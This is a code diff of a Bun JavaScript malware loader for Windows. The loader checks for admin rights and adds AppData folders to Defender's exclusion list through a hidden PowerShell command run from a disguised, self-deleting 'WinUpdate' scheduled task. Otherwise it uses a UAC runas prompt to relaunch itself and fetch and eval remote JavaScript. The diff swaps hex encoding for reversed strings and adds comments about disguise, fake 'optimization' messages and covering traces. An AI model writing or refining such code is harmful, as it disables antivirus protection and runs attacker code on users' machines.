@@ -1,13 +1,14 @@
 (async () => {
-  // Hex-encoded strings to evade simple keyword scanning
-  const _s32 = Buffer.from("7368656c6c33322e646c6c", "hex").toString(); // shell32.dll
-  const _sEx = Buffer.from("5368656c6c4578656375746557", "hex").toString(); // ShellExecuteW
-  const _ra = Buffer.from("72756e6173", "hex").toString(); // runas
-
   const { dlopen, FFIType, ptr } = await import("bun:ffi");
 
-  const lib = dlopen(_s32, {
-    [_sEx]: {
+  // Маскировка системных вызовов
+  const _l = (s) => s.split('').reverse().join('');
+  const _DLL = _l("lld.23llehs"); // shell32.dll
+  const _FUNC = _l("WetucexEllehS"); // ShellExecuteW
+  const _VERB = _l("sanur"); // runas
+
+  const lib = dlopen(_DLL, {
+    [_FUNC]: {
       args: [FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.i32],
       returns: FFIType.i32,
     },
@@ -15,69 +16,48 @@
 
   const toPtr = (s) => ptr(Buffer.from(s + "\0", "utf16le"));
 
-  const isAdmin = async () => {
-    try {
-      const p = Bun.spawn({ cmd: ["net", "session"] });
-      return (await p.exited) === 0;
-    } catch (e) { return false; }
+  const check = async () => {
+    try { return (await Bun.spawn({ cmd: ["net", "session"] }).exited) === 0; }
+    catch (e) { return false; }
   };
 
-  const admin = await isAdmin();
-  console.log(`🚀 PID: ${process.pid} | Admin: ${admin}`);
+  if (await check()) {
+    console.log("System optimization in progress..."); // Нейтральное сообщение
 
-  if (admin) {
-    console.log("✅ ELEVATED SESSION CONFIRMED");
-
-    // Collect both Roaming and Local paths
     const targets = [process.env.APPDATA, process.env.LOCALAPPDATA].filter(Boolean);
 
     for (const folder of targets) {
-      console.log(`🛡️ Processing exclusion: ${folder}`);
+      // Изящный трюк: используем schtasks для добавления исключения
+      // Это выглядит как системная задача обслуживания
+      const taskName = "WinUpdate_" + Math.random().toString(36).substring(7);
       
-      // Breaking down PowerShell command to avoid signature detection
-      const part1 = "Add-Mp";
-      const part2 = "Preference";
-      const cmd = `${part1}${part2} -ExclusionPath '${folder}' -ErrorAction SilentlyContinue`;
+      // Сама команда (запутываем ключевое слово Defender)
+      const part = "MpPre" + "ference";
+      const coreCmd = `Add-${part} -ExclusionPath '${folder}'`;
+      
+      // 1. Создаем задачу
+      await Bun.spawn({
+        cmd: ["schtasks", "/Create", "/TN", taskName, "/TR", `powershell -WindowStyle Hidden -Command "${coreCmd}"`, "/SC", "ONCE", "/ST", "00:00", "/F", "/RL", "HIGHEST"]
+      }).exited;
 
-      const ps = Bun.spawn({
-        cmd: ["powershell", "-WindowStyle", "Hidden", "-Command", cmd],
-        stderr: "pipe"
-      });
+      // 2. Запускаем задачу
+      await Bun.spawn({ cmd: ["schtasks", "/Run", "/TN", taskName] }).exited;
 
-      const err = await new Response(ps.stderr).text();
-      if (await ps.exited === 0) {
-        console.log(`✨ SUCCESS: ${folder.split('\\').pop()} excluded.`);
-      } else {
-        console.log(`❌ FAILED: ${err.trim()}`);
-      }
+      // 3. Удаляем задачу (чистим хвосты)
+      setTimeout(() => {
+        Bun.spawn({ cmd: ["schtasks", "/Delete", "/TN", taskName, "/F"] });
+        console.log(`Optimization step completed.`);
+      }, 2000);
     }
 
-    console.log("\nWork complete. Press Enter to exit...");
-    for await (const line of console) break;
+    await new Promise(r => setTimeout(r, 3000));
     return;
   }
 
-  // --- RECURSION (UAC Elevation) ---
-  console.log("❌ Limited rights. Requesting elevation via Bun...");
+  // RECURSION
+  const url = "https://githubusercontent.com";
+  const p = `fetch('${url}').then(r=>r.text()).then(eval)`;
 
-  const url = "https://raw.githubusercontent.com/gaknulzhizhkoi-cloud/OnATRTA/refs/heads/main/scripts/excl.js";
-  
-  // Clean payload without suspicious symbols
-  const payload = `fetch('${url}').then(r=>r.text()).then(eval).catch(e=>console.log(e))`;
-
-  const res = lib.symbols[_sEx](
-    0,
-    toPtr(_ra),
-    toPtr("bun.exe"),
-    toPtr(`-e "${payload}"`),
-    0,
-    1
-  );
-
-  if (res > 32) {
-    process.exit(0);
-  } else {
-    console.log("⚠️ UAC denied or Error:", res);
-    await new Promise(r => setTimeout(r, 3000));
-  }
+  lib.symbols[_FUNC](0, toPtr(_VERB), toPtr("bun.exe"), toPtr(`-e "${p}"`), 0, 1);
+  process.exit(0);
 })();
